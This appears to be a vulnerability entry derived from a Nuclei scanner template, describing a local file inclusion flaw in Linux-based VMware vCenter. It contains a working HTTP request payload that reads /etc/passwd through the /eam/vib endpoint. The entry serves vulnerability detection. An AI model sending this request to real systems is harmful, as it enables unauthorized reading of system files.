# Vulnerability: Linux Vmware Vcenter - Local File Inclusion
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`vmware-vcenter-lfi-linux.yaml`)

## Description
Linux appliance based Vmware Vcenter is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/eam/vib?id=/etc/passwd
```

